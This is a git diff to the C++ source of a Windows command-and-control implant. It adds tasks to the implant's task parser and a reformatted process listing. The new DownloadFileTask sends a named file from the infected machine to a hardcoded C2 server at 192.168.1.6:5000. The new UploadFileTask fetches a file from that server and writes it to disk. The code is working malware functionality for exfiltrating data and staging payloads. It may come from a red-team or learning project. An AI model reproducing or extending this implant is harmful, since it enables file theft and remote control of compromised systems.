@@ -10,11 +10,12 @@
 #include <fstream>
 #include <cstdlib>
 
-#include <boost/uuid/uuid_io.hpp>
+#include <cpr/cpr.h>
 #include <boost/property_tree/ptree.hpp>
 
 #include <Windows.h>
 #include <tlhelp32.h>
+
 
 extern std::string ids;
 // Function to parse the tasks from the property tree returned by the listening post
@@ -56,6 +57,18 @@ extern std::string ids;
     if (taskType == ListRunningProcesses::key && idString == ids) {
         return ListRunningProcesses{
             ids
+        };
+    }
+    if (taskType == DownloadFileTask::key && idString == ids) {
+        return DownloadFileTask{
+            ids,
+            taskTree.get_child("file").get_value<std::string>()
+        };
+    }
+    if (taskType == UploadFileTask::key && idString == ids) {
+        return UploadFileTask{
+            ids,
+            taskTree.get_child("file").get_value<std::string>()
         };
     }
 
@@ -232,7 +245,7 @@ Result ListRunningProcesses::run() const {
             // STUPID CONVERSION FROM WCHAR TO ASCII STRING!!!!
             std::wstring ws(pe32.szExeFile);
             std::string process_name(ws.begin(), ws.end());
-            processList << "Process: [" << process_name << "] PID: [" << pe32.th32ProcessID << "]\n";
+            processList << "Process: |" << process_name << "|\tPID: |" << pe32.th32ProcessID << "|\n";
 
         } while (Process32NextW(hProcessSnap, &pe32));
  
@@ -241,5 +254,57 @@ Result ListRunningProcesses::run() const {
     }
     catch (const std::exception& e) {
         return Result{ id, e.what(), false };
+    }
+}
+
+// DownloadFileTask (Uploads file to the C2 server)
+// -------------------------------------------------------------------------------------------
+DownloadFileTask::DownloadFileTask(const std::string& id, std::string path)
+    : id{ id },
+    path{ path } {}
+
+Result DownloadFileTask::run() const {
+    std::ifstream ifile(path);
+    if (ifile) {
+        std::string filepath = path;
+        // Remove directory if present.
+        std::string base_filename = path.substr(path.find_last_of("/\\") + 1);
+
+        std::stringstream ss;
+        ss << "http://192.168.1.6:5000/files/" << base_filename;
+        std::string fullServerUrl = ss.str();
+        cpr::Response r = cpr::Post(cpr::Url{ fullServerUrl }, cpr::Multipart{ {"Filedata", cpr::File{filepath}}});
+
+        if (r.status_code == 201) { // checks if the request has return 201 CREATED
+            return Result{ id, "File Download Successful!", true};
+        }
+        else {
+            return Result{ id, "File Download Failed!", false };
+        }
+    }
+    else {
+        return Result{ id, "File Doesn't Exists!", false };
+    }
+}
+
+
+// UploadFileTask (Downloads File From the C2 server)
+// -------------------------------------------------------------------------------------------
+UploadFileTask::UploadFileTask(const std::string& id, std::string filename)
+    : id{ id },
+    filename{ filename } {}
+
+Result UploadFileTask::run() const {
+
+    std::ofstream of(filename, std::ios::binary);
+    std::stringstream ss;
+    ss << "http://192.168.1.6:5000/files/" << filename;
+    std::string fullServerUrl = ss.str();
+    cpr::Response r = cpr::Download(of, cpr::Url{ fullServerUrl });
+    if (r.status_code == 200) { // checks if the file has been downloaded successfully by the implant
+        return Result{ id, "File Successfully Uploaded!", true };
+    }
+    else {
+        return Result{ id, "File Upload Failed!", false };
     }
 }
